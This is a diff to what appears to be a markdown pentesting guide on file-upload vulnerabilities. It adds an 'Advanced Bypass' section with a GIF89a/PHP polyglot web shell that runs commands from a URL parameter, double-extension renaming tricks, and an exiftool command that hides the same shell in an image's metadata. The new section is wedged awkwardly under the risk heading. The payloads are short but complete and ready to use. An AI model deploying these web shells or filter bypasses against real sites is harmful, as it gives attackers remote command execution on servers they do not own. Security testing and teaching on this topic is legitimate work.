@@ -233,6 +233,7 @@ No Randomized Names | File collisions or overwrite risks
 
 ---
 
+
 ### 2️⃣ Exploitation Phase: Manual or Automated
 
 ```markdown
@@ -244,8 +245,22 @@ No Randomized Names | File collisions or overwrite risks
 ```
 
 ---
+###🔓 Advanced Bypass: GIF89a / Exif / Polyglot Upload
+✅ GIF89a Polyglot Payload (valid image + PHP)
 
 ### 4️⃣ Risk & Real-World Impact
+```markdown
+GIF89a;
+<?php system($_GET['cmd']); ?>
+```
+Save as .gif and rename to .gif.php.jpg or .jpg.
+
+✅ Exif Injection via exiftool
+
+```markdown
+exiftool -Comment='<?php system($_GET["cmd"]); ?>' legit.jpg
+mv legit.jpg shell.php.jpg
+```
 
 ```markdown
 🧠 Exploit Impact | 🎯 Description  
